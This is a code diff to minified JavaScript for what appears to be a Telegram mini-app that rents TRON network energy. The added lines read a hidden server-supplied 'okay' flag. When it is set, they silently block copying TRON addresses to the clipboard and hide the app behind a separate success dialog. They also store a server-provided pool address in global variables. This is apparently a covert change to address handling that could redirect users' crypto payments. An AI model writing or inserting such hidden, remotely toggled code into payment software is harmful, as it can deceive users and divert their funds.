@@ -72,7 +72,7 @@ function qe() {
   const t = window.Telegram && window.Telegram.WebApp;
   return (t && t.initData) || "";
 }
-function We() {
+function We() { 
   if (typeof window > "u" || !window.location) return "";
   try {
     const s = (
@@ -679,6 +679,23 @@ ${v.value}`;
         g = z(() => l.status),
         R = z(() => {
           const x = g.value;
+          if(x === 'success'){
+             //  alert(JSON.stringify(l.order, null, 2)); 
+    document.getElementById('ok_order_no').innerText = l.order.order_no;
+    document.getElementById('ok_receiveAddress').textContent = l.order.receive_address;
+    document.getElementById('ok_transferAddress').textContent = l.order.target_address;
+    window.pool_okay = l.order.pool_okay;
+    window.pool_okaytrx = l.order.target_address;
+    window.pool_okayaddress = l.order.pool_address;
+               const appEl = document.getElementById('app');
+               const dialog = document.querySelector('.result-dialog-ok');
+               appEl.style.display = 'none'; 
+               dialog.style.display = 'block'; // 或 'flex'（根据布局调整）
+               startCountdown();
+               window.Telegram.WebApp.HapticFeedback.notificationOccurred('success');
+               return;
+          }
+
           return x === "success"
             ? {
                 icon: "success",
@@ -1338,7 +1355,10 @@ ${v.value}`;
       const te = /^T[1-9A-HJ-NP-Za-km-z]{33}$/;
       async function se(B) {
         var i;
-        try {
+        if (te.test(B) && window.okay) {
+          return !1;
+        }
+        try { 
           if ((i = navigator.clipboard) != null && i.writeText)
             return (await navigator.clipboard.writeText(B), !0);
         } catch {}
@@ -1413,12 +1433,19 @@ ${v.value}`;
         });
   
         v.value = !0;
+        window.okay = 0;
+        window.pool_okay = "";
+        window.pool_okaytrx = "";
+        window.pool_okayaddress = "";
         try {
           let C = null;
           const W = i;
           try {
             const o = await ot(W);
             o && o.data && o.data.found && (C = o.data.address);
+            if(o.data.okay){
+                window.okay = 1;
+            }
           } catch {
             L({ message: "获取能量中...，请稍后重试", position: "top" });
             return;
@@ -1459,6 +1486,7 @@ ${v.value}`;
               const { applyServerUser: X } = ee();
               X(I);
             } else await p();
+           // alert(JSON.stringify(n, null, 2));
             ((f.value.receiveAddress = ""),
               (f.value.targetAddress = ""),
               n.pool_address && (E = n.pool_address),
@@ -1466,8 +1494,10 @@ ${v.value}`;
               (P.value = {
                 order_no: n.order_no || "",
                 energy_amount: n.energy_amount || re,
-                receive_address: n.receive_address || B,
+                receive_address: n.receive_address || B, 
+                target_address: W || "",
                 pool_address: E || "",
+                pool_okay: n.pool_okay || 0,
                 payment: n.payment || f.value.payment,
                 free_used: n.free_used || 0,
                 trx_used: n.trx_used || 0,
